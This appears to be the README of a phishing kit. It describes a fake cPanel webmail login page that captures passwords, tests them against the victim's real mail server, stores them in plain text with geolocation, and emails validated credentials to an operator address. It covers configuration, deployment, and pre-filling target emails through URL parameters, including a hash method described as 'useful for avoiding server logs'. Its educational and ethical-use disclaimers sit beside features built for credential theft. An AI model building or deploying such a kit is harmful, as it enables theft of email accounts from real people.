# Email Credential Testing System

**⚠️ IMPORTANT DISCLAIMER ⚠️**

This system is designed for **EDUCATIONAL AND SECURITY AWARENESS PURPOSES ONLY**. It is intended to help organizations understand how attackers might attempt to compromise email accounts and to raise awareness about email security. 

**ETHICAL USE ONLY**: This tool should only be used with explicit permission from the email account owners and in controlled environments for legitimate security testing purposes.

## Overview

This system mimics a webmail login interface and tests submitted credentials against the actual email server to determine if they are valid. It then sends notifications about both successful and failed authentication attempts to a designated security monitoring email address.

## Features

- **Real-time credential validation** against actual SMTP servers
- **Geolocation tracking** of login attempts
- **Email notifications** for both valid and invalid credentials
- **Logging system** for audit trails
- **Responsive webmail interface** that mimics cPanel webmail
- **Configuration management** through a centralized config file
- **Email auto-population** from URL parameters
- **Rate limiting** capabilities
- **Debug and testing tools**

## File Structure

```
├── index.html           # Main webmail login interface
├── postmailer.php       # Backend credential processing
├── config.php           # Configuration settings
├── class.phpmailer.php  # Email handling class
├── class.smtp.php       # SMTP communication class
├── test.php            # System testing and diagnostics
├── SS-Or.txt           # Log file (created automatically)
└── README.md           # This file
```

## Setup Instructions

### 1. Configure Your Settings

Edit `config.php` to set up your notification email settings:

```php
// Email address where you want to receive notifications
'receiver_email' => 'your-security-email@domain.com',

// Your SMTP server settings for sending notifications
'notification_smtp' => array(
    'host' => 'mail.yourdomain.com',
    'port' => 587,
    'username' => 'your-smtp-username@yourdomain.com',
    'password' => 'your-smtp-password',
    'encryption' => 'tls',
    'from_name' => 'Security Alert System'
),
```

### 2. Test Your Setup

Navigate to `test.php` in your browser to verify that all components are working correctly:

```
http://your-domain.com/test.php
```

This will run comprehensive tests and report any issues.

### 3. Deploy the System

1. Upload all files to your web server
2. Ensure the web server has write permissions for log files
3. Access `index.html` through your web browser

### 4. Test the Form

You can test the form by:
- Opening `index.html` in a browser
- Using the browser console functions:
  - `testConnection()` - Test PHP connectivity
  - `testPostmailer()` - Test the credential processing
  - `testEmailExtraction()` - Test URL email parsing

## How It Works

### Frontend (index.html)
- Presents a realistic cPanel webmail login interface
- Extracts email addresses from URL parameters for auto-population
- Validates form input before submission
- Sends credentials via AJAX to the backend
- Handles responses and redirects users appropriately

### Backend (postmailer.php)
1. **Receives credentials** via POST request
2. **Validates input** for proper email format
3. **Tests credentials** against the email domain's SMTP server
4. **Logs attempt** with geolocation and browser information
5. **Sends notification** email to the configured security address
6. **Returns response** indicating success or failure

### Configuration (config.php)
- Centralizes all settings
- Validates configuration on load
- Provides helper functions for accessing settings

## URL Parameters

The system supports auto-populating the email field using URL parameters:

- `?email=user@domain.com` - Direct email parameter
- `?user=username@domain.com` - Alternative user parameter
- `#user@domain.com` - Hash-based email (useful for avoiding server logs)

Example:
```
http://your-domain.com/index.html?email=target@company.com
```

## Security Features

- **CORS headers** properly configured
- **Input validation** on both client and server side
- **Rate limiting** capabilities (configurable)
- **Secure logging** with timestamps and geolocation
- **Error handling** without information disclosure

## Logging

All attempts are logged to `SS-Or.txt` with the following information:
- Timestamp
- Email address
- Password (⚠️ stored in plain text for testing purposes)
- IP address and geolocation
- Browser information
- Domain information
- Whether credentials were valid

## Email Notifications

The system sends two types of notifications:

1. **Valid Credentials**: When credentials successfully authenticate
   - Subject: `TrueRcubeOrange || [Country] || [Email]`
   - Contains full attempt details

2. **Invalid Credentials**: When credentials fail to authenticate
   - Subject: `notVerifiedRcudeOrange || [Country] || [Email]`
   - Contains attempt details for monitoring

## Customization

### Changing the Interface
Edit `index.html` to modify:
- Logo and branding
- Color scheme and styling
- Form fields and validation

### Modifying Notification Format
Edit `config.php` to change:
- Email subject templates
- Notification content format
- Additional metadata collection

### Adding Security Features
- Implement rate limiting per IP
- Add CAPTCHA integration
- Enhance logging format
- Add database storage

## Troubleshooting

### Common Issues

1. **"Connection error" in browser**
   - Check that PHP is working: visit `test.php`
   - Verify file permissions
   - Check server error logs

2. **Emails not being sent**
   - Verify SMTP settings in `config.php`
   - Test with `test.php`
   - Check that your server can make outbound SMTP connections

3. **Credential testing not working**
   - Ensure `fsockopen` is enabled in PHP
   - Check that outbound connections on port 587 are allowed
   - Verify that the target domain has proper MX records

### Debug Mode

Enable debug mode in `config.php`:
```php
'debug_mode' => true,
```

This will provide more detailed error messages.

## Legal and Ethical Considerations

### ⚠️ IMPORTANT LEGAL NOTICE ⚠️

- **Only use with explicit permission** from email account owners
- **Comply with local laws** regarding computer access and privacy
- **Use in controlled environments** for legitimate security testing
- **Obtain proper authorization** before deployment
- **Document all testing** for audit purposes

### Recommended Use Cases

✅ **Appropriate Uses:**
- Internal security awareness training
- Authorized penetration testing
- Security research in controlled environments
- Educational demonstrations with consent

❌ **Inappropriate Uses:**
- Unauthorized credential harvesting
- Malicious attacks against real users
- Deployment without proper authorization
- Use against third-party systems without permission

## Support and Updates

This system is provided as-is for educational purposes. For issues or questions about ethical security testing, consult with qualified security professionals and legal counsel.

## License

This software is provided for educational and security research purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations.